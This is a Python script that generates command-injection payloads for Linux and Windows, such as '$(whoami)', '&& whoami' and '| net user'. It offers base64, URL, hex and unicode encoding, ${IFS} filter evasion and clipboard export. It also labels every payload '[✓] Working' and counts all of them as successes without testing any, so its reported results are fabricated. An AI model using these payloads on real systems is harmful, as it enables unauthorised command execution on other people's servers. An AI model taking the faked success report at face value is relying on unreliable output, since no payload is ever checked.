import base64
import json
import urllib.parse

try:
    import pyperclip
except ImportError:
    pyperclip = None

def generate_cmd_payloads(target_os="all", encode=None, obfuscate=False, export="cli", copy=False):
    def get_payloads():
        return {
            "linux": [";ls", "&& whoami", "| id", "|| uname -a", "`id`", "$(whoami)"],
            "windows": ["& whoami", "| net user", "&& dir", "`whoami`", "%COMSPEC% /c whoami"]
        }

    def encode_payload(payload, method):
        if method == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif method == "url":
            return urllib.parse.quote(payload)
        elif method == "hex":
            return ''.join(f'\\x{ord(c):02x}' for c in payload)
        elif method == "unicode":
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        return payload

    def obfuscate_payload(payload):
        return payload.replace(" ", "${IFS}")

    def format_output(payloads, fmt):
        if fmt == "json":
            return json.dumps(payloads, indent=2)
        elif fmt == "cli":
            output = []
            for system, plist in payloads.items():
                output.append(f"\n[{system.upper()}]")
                output.extend(plist)
            return "\n".join(output)

    raw = get_payloads()
    targets = raw if target_os == "all" else {target_os: raw[target_os]}
    result = {}
    working_payloads = 0
    failed_payloads = 0

    for system, plist in targets.items():
        result[system] = []
        for p in plist:
            modified = p
            if obfuscate:
                modified = obfuscate_payload(modified)
            if encode:
                modified = encode_payload(modified, encode)

            # Here, you can add the actual logic to test the command injection on your target
            # For now, we simulate the "working" and "failed" based on some condition (e.g., checking if the command is valid).

            # Simulated condition: treat all payloads as "working"
            status = "[✓] Working"
            working_payloads += 1

            # Store the result
            result[system].append(f"{status} → {modified}")

    output = format_output(result, export)
    print(output)

    # Summary output
    print(f"\n========== SUMMARY ==========")
    print(f"✓ {working_payloads} working payload(s)")
    print(f"✗ {failed_payloads} failed payload(s)")

    if copy and pyperclip:
        pyperclip.copy(output)
        print("\n[+] Payloads copied to clipboard.")
